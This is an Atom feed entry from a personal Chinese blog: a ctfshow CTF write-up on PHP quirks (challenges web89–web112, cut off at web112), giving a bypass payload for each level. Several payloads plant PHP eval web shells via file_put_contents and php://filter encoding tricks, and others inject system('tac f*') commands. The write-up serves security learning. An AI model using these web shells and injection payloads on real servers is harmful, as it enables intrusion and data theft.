<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yun421</title>
  
  <subtitle>记录学习中的点点滴滴</subtitle>
  <link href="http://yun421.top/atom.xml" rel="self"/>
  
  <link href="http://yun421.top/"/>
  <updated>2022-03-04T09:56:37.583Z</updated>
  <id>http://yun421.top/</id>
  
  <author>
    <name>Yun421</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshow.PHP特性</title>
    <link href="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/"/>
    <id>http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/</id>
    <published>2022-03-04T09:17:29.000Z</published>
    <updated>2022-03-04T09:56:37.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-PHP特性"><a href="#ctfshow-PHP特性" class="headerlink" title="ctfshow.PHP特性"></a>ctfshow.PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041726118.png" alt="chrome_Jb5AopKoUw"></p><p>数组绕过正则表达式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">返回值</span><br><span class="line">返回完整匹配次数（可能是<span class="number">0</span>），或者如果发生错误返回<span class="literal">FALSE</span>。</span><br></pre></td></tr></table></figure><p>也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if</p><p>payload:num[]=1</p><span id="more"></span><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041740520.png" alt="chrome_gduw5EGYmx"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)</span><br></pre></td></tr></table></figure><p>payload：num=4476.</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041740229.png" alt="chrome_IvEwGmF6Iw"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">正则表达式修饰符</span><br><span class="line"></span><br><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line">preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line">preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure><p>可以通过换行绕过第二个判断</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">0</span>aphp%<span class="number">0</span>a就是表示换行</span><br></pre></td></tr></table></figure><p>%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。<br>经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag</p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041740884.png" alt="chrome_QzRexRF5zf"></p><p>两层判断，第一层不能是4476，第二层取整，于是直接小数点绕过</p><p>payload：num=4476.1</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041740629.png" alt="chrome_jMEnq13pgy"></p><p>多过滤了字母，不影响操作</p><p>payload：num=4476.1</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041741152.png" alt="chrome_NlAabp7Skh"></p><p>strpos函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos — 查找字符串首次出现的位置</span><br><span class="line">也就是说num中必须出现<span class="number">0</span>，且<span class="number">0</span>不能出现在第一位，因为如果出现在第一位则strpos返回<span class="number">0</span>，<span class="number">0</span>取反条件成立执行<span class="keyword">die</span></span><br><span class="line">strpos() 函数对大小写敏感    </span><br></pre></td></tr></table></figure><p>这个不影响操作，小数里写个0就可以了</p><p>payload：num=4476.0</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041741314.png" alt="chrome_PQDjIAiOQO"></p><p>把小数点过滤了</p><p>用8进制绕过一下</p><p>payload：num= 010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041741439.png" alt="chrome_5vTOQBAn5N"></p><p>路径问题<br>下面方式在highlight_file中均等效于flag.php，也即本题的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php://filter/resource=flag.php      php伪协议</span><br></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041741526.png" alt="chrome_jVoKZrYSTD"></p><p>POST传入a,b,要求两变量的值不相同，但是MD5后的值相同</p><p>数组类型绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>​                                                                                                              <strong>–摘取自<a href="https://blog.csdn.net/miuzzx/article/details/109168454">https://blog.csdn.net/miuzzx/article/details/109168454</a></strong></p><p>md5弱比较,使用了强制类型转换后不再接收数组</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line"><span class="keyword">if</span>(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为<span class="number">0</span>e开头的会被识别为科学记数法，结果均为<span class="number">0</span>，所以只需找两个md5后都为<span class="number">0</span>e开头且<span class="number">0</span>e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=<span class="number">240610708</span></span><br></pre></td></tr></table></figure><p>md5强碰撞</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line"><span class="keyword">if</span>(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041742644.png" alt="chrome_RaM5M2MzTD"></p><p>三目运算符</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表达式 (expr1) ? (expr2) : (expr3) 在 expr1 求值为 true 时的值为 expr2，在 expr1 求值为 false 时的值为 expr3</span><br><span class="line">可以省略三目运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 true 时返回 expr1，否则返回 expr3</span><br></pre></td></tr></table></figure><p>根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值<br>最后一行是,如果get传了一个HTTP_FLAG=flag就输出flag否则显示index.php源码<br>所以我们get随便传一个，然后post传 HTTP_FLAG=flag即可</p><p>payload：</p><p>get：1 </p><p>post：HTTP_FLAG=flag</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041742298.png" alt="chrome_o4rUHC9XAU"></p><p>上边的for就是生成了一个有数字组成的数组</p><p>php弱类型比较</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$allow = array(<span class="number">1</span>,<span class="comment">&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回的为true</span><br><span class="line"></span><br><span class="line">$allow = array(<span class="comment">&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回false</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>：n=<span class="number">1</span>.php </span><br><span class="line">post：content=&lt;?php eval($_POST[<span class="number">1</span>]);?&gt;</span><br></pre></td></tr></table></figure><p>后面命令执行了</p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041743774.png" alt="chrome_macamcSN0m"></p><p>我们看这个题get传入v1,v2,v3，v0即满足v1为数字即可。</p><p>and和&amp;&amp;的区别：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> &amp;&amp; <span class="literal">false</span> &amp;&amp; <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>题目上的注释告诉我们一个知识反射类</p><p>直接输出 ctfshow 类即可，也就是构造出  echo new ReflectionClass(‘ctfshow’); payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p><p>payload：v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p><p>得到flag为ctfshow{5b08f63b0x2d96ec0x2d498d0x2da78a0x2d084356355690},注意将0x2d转换为-，</p><p>ctfshow{5b08f63b-96ec-498d-a78a-084356355690}</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041743688.png" alt="chrome_Amz6uPzInf"></p><p>前面和上一题都一样，v2被过滤了</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\|/|~|`|!|@|#|$|%|^|*|)|-|_|+|=|&#123;|[|<span class="string">&quot;|&#x27;|,|.|;|?|[0-9]|</span></span><br></pre></td></tr></table></figure><p>v3过滤了</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\|/|~|`|!|@|#|$|%|^|*|)|-|_|+|=|&#123;|[|<span class="string">&quot;|&#x27;|,|.|?|[0-9]|</span></span><br></pre></td></tr></table></figure><p>比v2少一个|;|,发现这些过滤不影响操作</p><p>所以操作同上</p><p>payload：v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p><p>得到flag为ctfshow{ceceb8250x2d8cc20x2d4cad0x2d8c210x2d7dc29013d3a},注意将0x2d转换为-，</p><p>ctfshow{ceceb825-8cc2-4cad-8c21-7dc29013d3a}，flag少最后一位，爆破一下或手动都可</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041743576.png" alt="chrome_PbRHT1FGsF"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.is_numeric()</span><br><span class="line">判断是否是数字，is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的</span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;0x66&quot;</span>));  </span><br><span class="line">// php5的环境下返回<span class="literal">true</span>  php7返回<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">2.substr()</span><br><span class="line">字符串截取函数</span><br><span class="line">substr(<span class="string">&quot;Hello world&quot;</span>,6);</span><br><span class="line">从length长度开始截取默认是直到字符串的结尾</span><br><span class="line">// 输出 world</span><br><span class="line">    </span><br><span class="line">3.call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">把第一个参数作为回调函数调用</span><br><span class="line">也就是说<span class="variable">$v1</span>可以是函数名,<span class="variable">$s</span>就是函数的值,就可以调用函数</span><br><span class="line">    </span><br><span class="line">4.file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>)</span><br><span class="line">把str的内容放入v3文件中</span><br></pre></td></tr></table></figure><p>利用is_numeric的特性传入一个十六进制数,通过substr函数时 0x 会被截去, call_user_func 函数处调用 hex2bin 函数将16进制转换成字符串写入文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex2bin()</span><br><span class="line">转换十六进制字符串为二进制字符串</span><br><span class="line">hex2bin如果参数带<span class="number">0</span>x会报错</span><br></pre></td></tr></table></figure><p>将一句话编码成16进制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_GET</span>[1]);?&gt; </span><br><span class="line">0x3c3f706870206576616c28245f4745545b315d293b3f3e</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=0x3c3f706870206576616c28245f4745545b315d293b3f3e&amp;v3=1.php </span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure><p>本以为可以了，后来一看php版本7.3，直接重头再来，不过php5的话这个方法即可实现</p><p>看羽师傅wp得：</p><p>虽然文件内容不好控制，但是可以利用伪协议将内容进行编码转换。<br>所以如果能找到一条php语句经过base64编码，在转换为16进制之后全部都是数字就可以通过了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  *// PD89YGNhdCAqYDs=* </span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      *//这里直接用去掉=的base64* </span><br><span class="line">输出   5044383959474e6864434171594473 </span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php://filter/<span class="keyword">write</span>=convert.base64-decode/resource=<span class="number">1</span>.php</span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041743565.png" alt="chrome_zQGdSeRPtK"></p><p>对str变量过滤掉了php，不影响操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  *// PD89YGNhdCAqYDs=* </span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      *//这里直接用去掉=的base64* </span><br><span class="line">输出   5044383959474e6864434171594473 </span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php://filter/<span class="keyword">write</span>=convert.base64-decode/resource=<span class="number">1</span>.php</span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041743802.png" alt="chrome_38ppT01WvJ"></p><p>hash比较缺陷,这道题没有比较v1，v2的值，我们可以令v1=v2即可</p><p>payload：v1=a  v2=a</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041744446.png" alt="chrome_WekDb6GAUG"></p><p>题目一共有三个变量 <code>$error $suces $flag</code>我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：a=flag</span><br><span class="line">POST：<span class="built_in">error</span>=a</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041744431.png" alt="chrome_j6Warj79IS"></p><p>这个题比较了v1和v2的值，那么我们还可以使用数组绕过，或者网上找一下sha1后相同的值</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=a1</span><br><span class="line">post:v1=a2</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=w9KASOk6Ikap </span><br><span class="line">post:v1=aaO8zKZF</span><br></pre></td></tr></table></figure><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041744789.png" alt="chrome_hcFocP58tM"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="keyword">string</span>,<span class="keyword">array</span>) </span><br><span class="line">函数把查询字符串解析到变量中 </span><br><span class="line"><span class="keyword">string</span>  必需。规定要解析的字符串 </span><br><span class="line"><span class="keyword">array</span>可选。规定存储变量的数组名称。该参数指示变量存储到数组中</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;q=123&amp;p=456&#x27;</span>;</span><br><span class="line">parse_str(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;q&#x27;</span>];   <span class="comment">//输出123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;p&#x27;</span>];   <span class="comment">//输出456</span></span><br></pre></td></tr></table></figure><p>一下子就明白了，羽师傅yyds</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3=<span class="number">1</span> </span><br><span class="line">post:v1=flag=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">md5(<span class="number">1</span>)=c4ca4238a0b923820dcc509a6f75849b    </span><br></pre></td></tr></table></figure><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041745445.png" alt="chrome_93ZQjT1xMh"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ereg — 正则表达式匹配</span><br><span class="line">strrev — 字符串反转 </span><br><span class="line">intval — 获取变量的整数值</span><br></pre></td></tr></table></figure><p>题目hint</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure><p>构造payload，if要求c中要有字母，后面用%00截断绕过，十进制的0x36d为877，翻转后应该是778</p><p>payload：c=a%00778</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041747630.png" alt="chrome_BIakEtsKZq"></p><p><strong>考察点：php 异常类</strong><br>先来看下这个正则表达式/[a-zA-Z]+/ 匹配至少有一个字母的字符串<br>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br>举两个例子</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception</span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure><p>payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">Exception</span>();system(<span class="string">&#x27;tac f*&#x27;</span>);&amp;v2=a </span><br><span class="line">v1=ReflectionClass&amp;v2=system(<span class="string">&#x27;tac f*&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041747802.png" alt="chrome_tSIHJl27oq"></p><p>对v1和v2进行了大量的过滤</p><p><strong>考察点：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</strong><br>具体使用方法<br>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件，得到一个/查看根目录下的文件。php中的getcwd()可以帮到我们这个忙。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd()</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">getcwd(void):string</span><br></pre></td></tr></table></figure><p>payload：v1=FilesystemIterator&amp;v2=getcwd</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041747709.png" alt="chrome_xS7vGDB3Wo"></p><p><strong>考察点：php超全局变量$GLOBALS的使用</strong></p><p>介绍</p><p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>举个例子</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="number">123</span>;</span><br><span class="line">$b=<span class="number">456</span>;</span><br><span class="line">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure><p>返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">123</span>)</span><br><span class="line">[<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">456</span>)</span><br></pre></td></tr></table></figure><p>所以对于该题，只要把$GLOBALS赋值给v2，然后通过if判断，v2再赋值给v1,即可将全部变量输出.<br>payload: ?v1=ctfshow&amp;v2=GLOBALS</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041747482.png" alt="chrome_X5AnH5a53a"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_file — 